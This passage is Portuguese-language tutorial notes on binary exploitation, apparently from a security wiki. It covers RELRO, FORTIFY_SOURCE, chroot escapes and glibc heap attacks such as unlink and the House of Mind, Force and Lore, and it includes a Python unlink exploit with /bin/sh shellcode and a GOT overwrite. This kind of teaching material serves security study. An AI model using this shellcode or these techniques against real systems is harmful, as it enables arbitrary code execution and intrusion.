0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Sem relro:
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Para o bin√°rio **sem relro**, podemos ver que o endere√ßo da entrada `got` para `fgets` √© `0x404018`. Ao analisar os mapeamentos de mem√≥ria, vemos que ele est√° entre `0x404000` e `0x405000`, com as **permiss√µes `rw`**, o que significa que podemos ler e escrever nele. Para o bin√°rio **com relro**, vemos que o endere√ßo da tabela `got` para a execu√ß√£o do bin√°rio (o pie est√° ativado, ent√£o este endere√ßo mudar√°) √© `0x555555557fd0`. Nos mapeamentos de mem√≥ria desse bin√°rio, ele est√° entre `0x0000555555557000` e `0x0000555555558000`, com a permiss√£o de mem√≥ria **`r`**, o que significa que s√≥ podemos ler dele.

Ent√£o, qual √© o **bypass**? O bypass t√≠pico que eu uso √© simplesmente n√£o escrever em regi√µes de mem√≥ria que o relro faz ser somente leitura e **encontrar uma maneira diferente de obter a execu√ß√£o de c√≥digo**.

Observe que, para isso acontecer, o bin√°rio precisa conhecer previamente os endere√ßos das fun√ß√µes:

* Lazy binding: O endere√ßo de uma fun√ß√£o √© pesquisado na primeira vez que a fun√ß√£o √© chamada. Portanto, a `GOT` precisa ter permiss√µes de escrita durante a execu√ß√£o.
* Bind now: Os endere√ßos das fun√ß√µes s√£o resolvidos no in√≠cio da execu√ß√£o e, em seguida, permiss√µes somente leitura s√£o concedidas a se√ß√µes sens√≠veis como .got, .dtors, .ctors, .dynamic, .jcr. `` `** ``-z relro`**`y`**`-z now\`\*\*

Para verificar se um programa usa Bind now, voc√™ pode fazer:
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
Cuando o bin√°rio √© carregado na mem√≥ria e uma fun√ß√£o √© chamada pela primeira vez, o salto √© feito para a PLT (Procedure Linkage Table), a partir daqui √© feito um salto (jmp) para a GOT e descobre-se que essa entrada n√£o foi resolvida (cont√©m um endere√ßo seguinte da PLT). Ent√£o, o Runtime Linker ou rtfd √© invocado para resolver o endere√ßo e salv√°-lo na GOT.

Quando uma fun√ß√£o √© chamada, a PLT √© chamada, ela cont√©m o endere√ßo da GOT onde o endere√ßo da fun√ß√£o √© armazenado, redirecionando o fluxo para l√° e assim a fun√ß√£o √© chamada. No entanto, se for a primeira vez que a fun√ß√£o √© chamada, o que est√° na GOT √© a pr√≥xima instru√ß√£o da PLT, portanto o fluxo segue o c√≥digo da PLT (rtfd) e descobre o endere√ßo da fun√ß√£o, salva na GOT e chama.

Ao carregar um bin√°rio na mem√≥ria, o compilador informa em qual offset os dados que devem ser carregados quando o programa √© executado devem ser colocados.

Lazy binding ‚Äî> O endere√ßo da fun√ß√£o √© procurado apenas na primeira vez que a fun√ß√£o √© invocada, ent√£o a GOT tem permiss√µes de escrita para que, quando for procurado, seja salvo l√° e n√£o precise ser procurado novamente.

Bind now ‚Äî> Os endere√ßos das fun√ß√µes s√£o procurados ao carregar o programa e as permiss√µes das se√ß√µes .got, .dtors, .ctors, .dynamic, .jcr s√£o alteradas para somente leitura. **-z relro** e **-z now**

Apesar disso, geralmente os programas n√£o s√£o complicados com essas op√ß√µes, ent√£o esses ataques continuam sendo poss√≠veis.

**readelf -l /proc/ID\_PROC/exe | grep BIND\_NOW** ‚Äî> Para verificar se est√£o usando o BIND NOW

**Fortify Source -D\_FORTIFY\_SOURCE=1 ou =2**

Tenta identificar fun√ß√µes que copiam de um local para outro de forma insegura e substituir a fun√ß√£o por uma fun√ß√£o segura.

Por exemplo:\
char buf\[16];\
strcpy(but, source);

Identifica como inseguro e ent√£o substitui strcpy() por \_\_strcpy\_chk() usando o tamanho do buffer como tamanho m√°ximo a ser copiado.

A diferen√ßa entre **=1** ou **=2** √© que:

O segundo n√£o permite que **%n** venha de uma se√ß√£o com permiss√µes de escrita. Al√©m disso, o par√¢metro para acesso direto de argumentos s√≥ pode ser usado se os anteriores forem usados, ou seja, s√≥ pode ser usado **%3$d** se **%2$d** e **%1$d** forem usados antes.

Para exibir a mensagem de erro, o argv\[0\] √© usado, ent√£o se for colocado nele o endere√ßo de outro local (como uma vari√°vel global), a mensagem de erro mostrar√° o conte√∫do dessa vari√°vel. P√°gina 191

**Substitui√ß√£o do Libsafe**

Ativado com: LD\_PRELOAD=/lib/libsafe.so.2\
ou\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

As chamadas para algumas fun√ß√µes inseguras s√£o interceptadas por outras seguras. N√£o √© padronizado. (apenas para x86, n√£o para compila√ß√µes com -fomit-frame-pointer, n√£o para compila√ß√µes est√°ticas, nem todas as fun√ß√µes vulner√°veis se tornam seguras e LD\_PRELOAD n√£o funciona em bin√°rios com suid).

**ASCII Armored Address Space**

Consiste em carregar as bibliotecas compartilhadas de 0x00000000 a 0x00ffffff para sempre ter um byte 0x00. No entanto, isso realmente n√£o impede quase nenhum ataque, especialmente em little endian.

**ret2plt**

Consiste em realizar um ROP de forma que a fun√ß√£o strcpy@plt (da plt) seja chamada e aponte para a entrada da GOT e copie o primeiro byte da fun√ß√£o que se deseja chamar (system()). Em seguida, o mesmo √© feito apontando para GOT+1 e copiando o 2¬∫ byte de system()... Por fim, a fun√ß√£o chamada √© a que est√° armazenada na GOT, que ser√° system().

**Falso EBP**

Para fun√ß√µes que usam o EBP como registro para apontar para os argumentos ao modificar o EIP e apontar para system(), o EBP tamb√©m deve ser modificado para apontar para uma √°rea de mem√≥ria que tenha 2 bytes quaisquer e, em seguida, o endere√ßo de &‚Äù/bin/sh‚Äù.

**Jaulas com chroot()**

debootstrap -arch=i386 hardy /home/user ‚Äî> Instala um sistema b√°sico em um subdiret√≥rio espec√≠fico

Um administrador pode sair dessas jaulas fazendo: mkdir foo; chroot foo; cd ..

**Instrumenta√ß√£o de c√≥digo**

Valgrind ‚Äî> Procura por erros\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap Overflows: Exploits b√°sicos**

**Chunk alocado**

prev\_size |\
size | ‚ÄîCabe√ßalho\
\*mem | Dados

**Chunk livre**

prev\_size |\
size |\
\*fd | Ptr chunk seguinte\
\*bk | Ptr chunk anterior ‚ÄîCabe√ßalho\
\*mem | Dados

Os chunks livres est√£o em uma lista duplamente encadeada (bin) e nunca podem haver dois chunks livres juntos (eles s√£o unidos).

Em ‚Äúsize‚Äù h√° bits para indicar: se o chunk anterior est√° em uso, se o chunk foi alocado via mmap() e se o chunk pertence √† arena prim√°ria.

Ao liberar um chunk, se algum dos chunks cont√≠guos estiver livre, eles s√£o fundidos usando a macro unlink() e o novo chunk maior √© passado para frontlink() para ser inserido no bin apropriado.

unlink(){\
BK = P->bk; ‚Äî> O BK do novo chunk √© o que o chunk livre anterior tinha\
FD = P->fd; ‚Äî> O FD do novo chunk √© o que o chunk livre anterior tinha\
FD->bk = BK; ‚Äî> O BK do chunk seguinte aponta para o novo chunk\
BK->fd = FD; ‚Äî> O FD do chunk anterior aponta para o novo chunk\
}

Portanto, se conseguirmos modificar P->bk com o endere√ßo de um shellcode e P->fd com o endere√ßo de uma entrada na GOT ou DTORS menos 12, conseguimos:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

E assim, ao sair do programa, o shellcode √© executado.

Al√©m disso, a 4¬™ instru√ß√£o de unlink() escreve algo e o shellcode precisa ser ajustado para isso:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> Isso resulta na escrita de 4 bytes a partir do 8¬∫ byte do shellcode, ent√£o a primeira instru√ß√£o do shellcode deve ser um jmp para pular isso e chegar a uns nops que levam ao restante do shellcode.

Portanto, o exploit √© criado:

No buffer1, a shellcode √© inserida come√ßando com um jmp para cair nos nops ou no restante da shellcode.

Ap√≥s a shellcode, √© inserido preenchimento at√© chegar ao campo prev\_size e size do pr√≥ximo chunk. Nestes locais, s√£o inseridos 0xfffffff0 (para sobrescrever prev\_size e indicar que est√° livre) e ‚Äú-4‚Äù (0xfffffffc) em size (para que, ao verificar no 3¬∫ chunk se o 2¬∫ estava livre, na verdade v√° para o prev\_size modificado que dir√° que est√° livre) -> Assim, quando o free() investigar, ele ir√° para o size do 3¬∫, mas na verdade ir√° para o 2¬∫ - 4 e pensar√° que o 2¬∫ chunk est√° livre. Ent√£o, ele chamar√° **unlink()**.

Ao chamar unlink(), os primeiros dados do 2¬∫ chunk s√£o usados como P->fd, ent√£o o endere√ßo a ser sobrescrito - 12 (pois em FD->bk, 12 √© adicionado ao endere√ßo armazenado em FD) √© inserido l√°. E nesse endere√ßo, √© inserido o segundo endere√ßo encontrado no 2¬∫ chunk, que deve ser o endere√ßo da shellcode (falso P->bk).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**
**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #√â importante que o bit que indica que o chunk anterior est√° livre esteja como 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, para que pense que o "size" do 3¬∫ chunk est√° 4bytes atr√°s (aponta para prev\_size) onde ele verifica se o 2¬∫ chunk est√° livre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #No payload, vamos adicionar 8 bytes de preenchimento no in√≠cio**

**got\_free = pack("\<I", 0x08048300 - 12) #Endere√ßo de free() na plt-12 (ser√° sobrescrito para executar o shellcode na 2¬™ chamada a free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #Como mencionado, o payload come√ßa com 8 bytes de preenchimento**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #O 2¬∫ chunk √© modificado, got\_free aponta para onde vamos armazenar o endere√ßo addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando em sentido inverso (wargame)**

Estamos controlando 3 chunks consecutivos e eles s√£o liberados na ordem inversa da reserva.

Neste caso:

No chunk c, colocamos o shellcode

Usamos o chunk a para sobrescrever o b de forma que o bit PREV\_INUSE seja desativado, fazendo o programa pensar que o chunk a est√° livre.

Al√©m disso, sobrescrevemos o size no cabe√ßalho do b para que seja -4.

Assim, o programa pensar√° que o "a" est√° livre e em um bin, ent√£o chamar√° unlink() para desvincul√°-lo. No entanto, como o cabe√ßalho PREV\_SIZE √© -4, ele pensar√° que o chunk "a" realmente come√ßa em b+4. Ou seja, far√° um unlink() em um chunk que come√ßa em b+4, ent√£o em b+12 estar√° o ponteiro "fd" e em b+16 estar√° o ponteiro "bk".

Dessa forma, se colocarmos o endere√ßo do shellcode em bk e o endere√ßo da fun√ß√£o "puts()" -12 em fd, teremos nosso payload.

**T√©cnica de Frontlink**

Frontlink √© chamado quando algo √© liberado e nenhum dos chunks adjacentes est√° livre, unlink() n√£o √© chamado, mas frontlink() √© chamado diretamente.

Vulnerabilidade √∫til quando o malloc atacado nunca √© liberado (free()).

Requer:

Um buffer que pode ser sobrecarregado com a fun√ß√£o de entrada de dados

Um buffer adjacente a este que deve ser liberado e ter√° o campo fd de seu cabe√ßalho modificado devido √† sobrecarga do buffer anterior

Um buffer a ser liberado com um tamanho maior que 512, mas menor que o buffer anterior

Um buffer declarado antes do passo 3 que permite sobrescrever o prev\_size deste

Assim, conseguimos sobrescrever em dois mallocs de forma descontrolada e em um de forma controlada, mas apenas um √© liberado, podemos fazer um exploit.

**Vulnerabilidade double free()**

Se free() for chamado duas vezes com o mesmo ponteiro, dois bins apontar√£o para o mesmo endere√ßo.

Se quisermos reutilizar um, n√£o haver√° problemas. Se quisermos usar outro, ele receber√° o mesmo espa√ßo, ent√£o teremos os ponteiros "fd" e "bk" falsificados com os dados que a reserva anterior escrever√°.

**After free()**

Um ponteiro previamente liberado √© usado novamente sem controle.

## **8 Heap Overflows: Exploits avan√ßados**

As t√©cnicas Unlink() e FrontLink() foram removidas ao modificar a fun√ß√£o unlink().

**The house of mind**

Apenas uma chamada a free() √© necess√°ria para executar c√≥digo arbitr√°rio. √â interessante encontrar um segundo chunk que possa ser sobrecarregado pelo anterior e liberado.

Uma chamada a free() chama public\_fREe(mem), que faz:

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Retorna um ponteiro para o endere√ßo onde o chunk come√ßa (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main_arena(ptr)?heap_for_ptr(ptr)->ar_ptr:\&main_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

Em \[1], verifica o campo size do bit NON\_MAIN_ARENA, que pode ser alterado para que a verifica√ß√£o retorne verdadeira e execute heap_for_ptr(), que faz um and em "mem", deixando os 2,5 bytes menos significativos como 0 (por exemplo, de 0x0804a000 para 0x08000000) e acessa 0x08000000->ar_ptr (como se fosse um struct heap_info)

Dessa forma, se pudermos controlar um chunk, por exemplo, em 0x0804a000 e um chunk ser√° liberado em **0x081002a0**, podemos chegar ao endere√ßo 0x08100000 e escrever o que quisermos, por exemplo, **0x0804a000**. Quando este segundo chunk for liberado, ele encontrar√° que heap_for_ptr(ptr)->ar_ptr retorna o que escrevemos em 0x08100000 (pois √© aplicado um and em 0x081002a0 como vimos antes e da√≠ √© extra√≠do o valor dos primeiros 4 bytes, o ar_ptr)

Assim, √© chamado \_int\_free(ar_ptr, mem), ou seja, **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void_t\* mem){**\
‚Ä¶\
bck = unsorted_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Como vimos antes, podemos controlar o valor de av, pois √© o que escrevemos no chunk que ser√° liberado.

Como unsorted_chunks √© definido, sabemos que:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Portanto, se escrevermos o valor de \_\_DTOR\_END\_\_-12 em av->bins\[2], na √∫ltima instru√ß√£o, ser√° escrito em \_\_DTOR\_END\_\_ o endere√ßo do segundo chunk.

Ou seja, no primeiro chunk, no in√≠cio, devemos colocar v√°rias vezes o endere√ßo de \_\_DTOR\_END\_\_-12, pois √© de l√° que av->bins\[2] o pegar√°.

No endere√ßo onde cair o endere√ßo do segundo chunk com os √∫ltimos 5 zeros, devemos escrever o endere√ßo deste primeiro chunk para que heap_for_ptr() pense que ar_ptr est√° no in√≠cio do primeiro chunk e pegue av->bins\[2] de l√°.

No segundo chunk e gra√ßas ao primeiro, sobrescrevemos prev\_size com um jump 0x0c e size com algo para ativar -> NON\_MAIN_ARENA

Em seguida, no chunk 2, colocamos muitos nops e, finalmente, o shellcode

Dessa forma, ser√° chamado \_int\_free(CHUNK1, CHUNK2) e seguir√° as instru√ß√µes para escrever em \_\_DTOR\_END\_\_ o endere√ßo do prev\_size do CHUNK2, que saltar√° para o shellcode.

Para aplicar essa t√©cnica, alguns requisitos adicionais precisam ser atendidos, o que complica um pouco mais o payload.
Esta t√©cnica j√° n√£o √© aplic√°vel, pois quase o mesmo patch foi aplicado como para unlink. Eles s√£o comparados se o novo local para onde aponta tamb√©m est√° apontando para ele.

**Fastbin**

√â uma variante de The house of mind

interessa-nos executar o seguinte c√≥digo ap√≥s a primeira verifica√ß√£o da fun√ß√£o \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> Sendo fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

Desta forma, se for colocado em "fb", ele aponta para uma fun√ß√£o na GOT, onde ser√° colocada a dire√ß√£o do chunk sobrescrito. Para isso, √© necess√°rio que a arena esteja pr√≥xima das dire√ß√µes de dtors. Mais precisamente, av->max\_fast deve estar na dire√ß√£o que vamos sobrescrever.

Dado que com The House of Mind vimos que control√°vamos a posi√ß√£o do av.

Ent√£o, se no campo size colocarmos um tamanho de 8 + NON\_MAIN\_ARENA + PREV\_INUSE ‚Äî> fastbin\_index() retornar√° fastbins\[-1], que apontar√° para av->max\_fast

Neste caso, av->max\_fast ser√° a dire√ß√£o que ser√° sobrescrita (n√£o para onde aponta, mas essa posi√ß√£o ser√° sobrescrita).

Al√©m disso, √© necess√°rio que o chunk adjacente ao liberado seja maior que 8 -> Como dissemos que o tamanho do chunk liberado √© 8, neste chunk falso s√≥ precisamos colocar um tamanho maior que 8 (al√©m disso, a shellcode estar√° no chunk liberado, ent√£o no in√≠cio teremos que colocar um jmp que caia em nops).

Al√©m disso, esse mesmo chunk falso deve ser menor que av->system\_mem. av->system\_mem est√° 1848 bytes adiante.

Devido aos nulos de \_DTOR\_END\_ e √†s poucas dire√ß√µes na GOT, nenhum desses endere√ßos serve para ser sobrescrito, ent√£o vejamos como aplicar fastbin para atacar a pilha.

Outra forma de ataque √© redirecionar o **av** para a pilha.

Se modificarmos o size para ser 16 em vez de 8, ent√£o: fastbin\_index() retornar√° fastbins\[0] e podemos usar isso para sobrescrever a pilha.

Para isso, n√£o deve haver nenhum canary ou valores estranhos na pilha, na verdade, temos que encontrar isso: 4bytes nulos + EBP + RET

Os 4 bytes nulos s√£o necess√°rios para que o **av** esteja nesse endere√ßo e o primeiro elemento de um **av** √© o mutex que deve ser 0.

O **av->max\_fast** ser√° o EBP e ser√° um valor que nos permitir√° ignorar as restri√ß√µes.

No **av->fastbins\[0]** ser√° sobrescrito com o endere√ßo de **p** e ser√° o RET, assim a shellcode ser√° executada.

Al√©m disso, em **av->system\_mem** (1484 bytes acima da posi√ß√£o na pilha) haver√° bastante lixo que nos permitir√° ignorar a verifica√ß√£o que √© feita.

Al√©m disso, √© necess√°rio que o chunk adjacente ao liberado seja maior que 8 -> Como dissemos que o tamanho do chunk liberado √© 16, neste chunk falso s√≥ precisamos colocar um tamanho maior que 8 (al√©m disso, a shellcode estar√° no chunk liberado, ent√£o no in√≠cio teremos que colocar um jmp que caia em nops que v√™m ap√≥s o campo size do novo chunk falso).

**The House of Spirit**

Neste caso, procuramos ter um ponteiro para um malloc que possa ser alterado pelo atacante (por exemplo, o ponteiro est√° na pilha abaixo de um poss√≠vel overflow para uma vari√°vel).

Assim, poder√≠amos fazer com que esse ponteiro apontasse para onde quer que fosse. No entanto, nem todo local √© v√°lido, o tamanho do chunk falso deve ser menor que av->max\_fast e mais especificamente igual ao tamanho solicitado em uma chamada futura para malloc()+8. Portanto, se soubermos que ap√≥s esse ponteiro vulner√°vel √© feita uma chamada para malloc(40), o tamanho do chunk falso deve ser igual a 48.

Por exemplo, se o programa perguntar ao usu√°rio por um n√∫mero, poder√≠amos introduzir 48 e apontar o ponteiro de malloc modific√°vel para os pr√≥ximos 4 bytes (que poderiam pertencer ao EBP com sorte, assim o 48 fica atr√°s, como se fosse o cabe√ßalho size). Al√©m disso, o endere√ßo ptr-4+48 deve atender a v√°rias condi√ß√µes (sendo neste caso ptr=EBP), ou seja, 8 < ptr-4+48 < av->system\_mem.

Se isso for cumprido, quando a pr√≥xima chamada para malloc que dissemos que era malloc(40) for feita, o endere√ßo do EBP ser√° atribu√≠do. Caso o atacante tamb√©m possa controlar o que √© escrito nesse malloc, ele pode sobrescrever tanto o EBP quanto o EIP com o endere√ßo desejado.

Acredito que isso ocorre porque quando o free() √© chamado, ele armazenar√° que no endere√ßo apontado pelo EBP da pilha h√° um chunk do tamanho perfeito para o novo malloc() que est√° sendo reservado, ent√£o ele atribui esse endere√ßo.

**The House of Force**

√â necess√°rio:

* Um overflow para um chunk que permita sobrescrever o wilderness
* Uma chamada para malloc() com o tamanho definido pelo usu√°rio
* Uma chamada para malloc() cujos dados possam ser definidos pelo usu√°rio

O primeiro passo √© sobrescrever o tamanho do chunk wilderness com um valor muito grande (0xffffffff), para que qualquer solicita√ß√£o de mem√≥ria grande seja tratada em \_int\_malloc() sem a necessidade de expandir o heap.

O segundo passo √© alterar o av->top para apontar para uma √°rea de mem√≥ria sob o controle do atacante, como a pilha. Em av->top, ser√° colocado \&EIP - 8.

Precisamos sobrescrever av->top para apontar para a √°rea de mem√≥ria sob o controle do atacante:

v√≠tima = av->top;

restante = chunck\_at\_offset(v√≠tima, nb);

av->top = restante;

A v√≠tima obt√©m o valor da dire√ß√£o do chunk wilderness atual (o av->top atual) e o restante √© exatamente a soma dessa dire√ß√£o mais a quantidade de bytes solicitados por malloc(). Portanto, se \&EIP-8 estiver em 0xbffff224 e av->top contiver 0x080c2788, ent√£o a quantidade que precisamos reservar no malloc controlado para que av->top aponte para $EIP-8 para o pr√≥ximo malloc() ser√°:

0xbffff224 - 0x080c2788 = 3086207644.

Assim, o valor alterado ser√° armazenado em av->top e o pr√≥ximo malloc apontar√° para o EIP e poder√° ser sobrescrito.

√â importante saber que o tamanho do novo chunk wilderness seja maior que a solicita√ß√£o feita pelo √∫ltimo malloc(). Ou seja, se o wilderness estiver apontando para \&EIP-8, o tamanho ficar√° exatamente no campo EBP da pilha.

**The House of Lore**

**Corrup√ß√£o SmallBin**

Os chunks liberados s√£o inseridos no bin com base em seu tamanho. Mas antes de serem inseridos, eles s√£o armazenados em unsorted bins. Quando um chunk √© liberado, ele n√£o √© imediatamente colocado em seu bin, mas permanece em unsorted bins. Em seguida, se um novo chunk for alocado e o anterior liberado puder ser √∫til, ele ser√° retornado, mas se for alocado um chunk maior, o chunk liberado em unsorted bins ser√° colocado em seu bin apropriado.

Para alcan√ßar o c√≥digo vulner√°vel, a solicita√ß√£o de mem√≥ria deve ser maior que av->max\_fast (normalmente 72) e menor que MIN\_LARGE\_SIZE (512).

Se houver um chunk no bin do tamanho adequado ao que est√° sendo solicitado, ele ser√° retornado ap√≥s ser desvinculado:

bck = v√≠tima->bk; Aponta para o chunk anterior, √© a √∫nica informa√ß√£o que podemos alterar.

bin->bk = bck; O pen√∫ltimo chunk se torna o √∫ltimo, se bck apontar para a pilha, o pr√≥ximo chunk alocado receber√° esse endere√ßo

bck->fd = bin; A lista √© fechada fazendo com que ela aponte para bin

√â necess√°rio:
Reserve dois malloc, de modo que o primeiro possa sofrer overflow ap√≥s o segundo ter sido liberado e inserido em seu bin (ou seja, um malloc maior que o segundo deve ser reservado antes do overflow).

O malloc reservado com o endere√ßo escolhido pelo atacante deve ser controlado pelo atacante.

O objetivo √© o seguinte: se pudermos fazer um overflow em um heap que tenha um peda√ßo liberado abaixo dele e em seu bin, podemos alterar seu ponteiro bk. Ao alterar o ponteiro bk e se esse peda√ßo se tornar o primeiro da lista do bin e for reservado, o bin ser√° enganado e informado de que o pr√≥ximo peda√ßo da lista est√° na falsa dire√ß√£o que definimos (como stack ou GOT, por exemplo). Portanto, se outro peda√ßo for reservado e o atacante tiver permiss√µes nele, um peda√ßo na posi√ß√£o desejada ser√° fornecido e poder√° ser escrito nele.

Ap√≥s liberar o peda√ßo modificado, √© necess√°rio reservar um peda√ßo maior do que o liberado, para que o peda√ßo modificado saia dos unsorted bins e seja inserido em seu bin.

Uma vez no bin, √© hora de modificar o ponteiro bk atrav√©s do overflow para que aponte para o endere√ßo que desejamos sobrescrever.

Assim, o bin deve esperar at√© que malloc() seja chamado v√°rias vezes para que o bin modificado seja usado novamente e engane o bin, fazendo-o acreditar que o pr√≥ximo peda√ßo est√° na dire√ß√£o falsa. Em seguida, o peda√ßo desejado ser√° fornecido.

Para que a vulnerabilidade seja explorada o mais r√°pido poss√≠vel, o ideal seria: reservar o peda√ßo vulner√°vel, reservar o peda√ßo a ser modificado, liberar esse peda√ßo, reservar um peda√ßo maior do que o a ser modificado, modificar o peda√ßo (vulnerabilidade), reservar um peda√ßo do mesmo tamanho do vulnerado e reservar um segundo peda√ßo do mesmo tamanho, que apontar√° para o endere√ßo escolhido.

Para proteger esse ataque, √© usada a verifica√ß√£o t√≠pica de que o peda√ßo "n√£o" √© falso: verifica-se se bck->fd est√° apontando para a v√≠tima. Ou seja, no nosso caso, se o ponteiro fd* do peda√ßo falso apontado na pilha est√° apontando para a v√≠tima. Para contornar essa prote√ß√£o, o atacante deve ser capaz de escrever de alguma forma (provavelmente na pilha) no endere√ßo adequado da v√≠tima. Para que pare√ßa um peda√ßo verdadeiro.

**Corrup√ß√£o LargeBin**

S√£o necess√°rios os mesmos requisitos que antes e alguns adicionais, al√©m disso, os peda√ßos reservados devem ser maiores que 512.

O ataque √© semelhante ao anterior, ou seja, √© necess√°rio modificar o ponteiro bk e todas essas chamadas para malloc(), mas tamb√©m √© necess√°rio modificar o tamanho do peda√ßo modificado de forma que esse tamanho - nb seja < MINSIZE.

Por exemplo, √© necess√°rio definir o tamanho como 1552 para que 1552 - 1544 = 8 < MINSIZE (a subtra√ß√£o n√£o pode ser negativa porque √© comparada com um valor n√£o assinado).

Al√©m disso, foi introduzido um patch para torn√°-lo ainda mais complicado.

**Heap Spraying**

Basicamente consiste em reservar toda a mem√≥ria poss√≠vel para heaps e preench√™-los com um colch√£o de nops seguido de uma shellcode. Al√©m disso, o colch√£o √© preenchido com 0x0c. Assim, tenta-se saltar para o endere√ßo 0x0c0c0c0c e, se alguma dire√ß√£o for sobrescrita com esse colch√£o, o controle ser√° transferido para l√°. Basicamente, a t√°tica √© reservar o m√°ximo poss√≠vel para ver se algum ponteiro √© sobrescrito e saltar para 0x0c0c0c0c, esperando que haja nops l√°.

**Heap Feng Shui**

Consiste em cimentar a mem√≥ria por meio de reservas e libera√ß√µes, de modo que peda√ßos reservados fiquem entre peda√ßos livres. O buffer a ser transbordado ser√° colocado em um desses peda√ßos.

## Cursos Interessantes

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
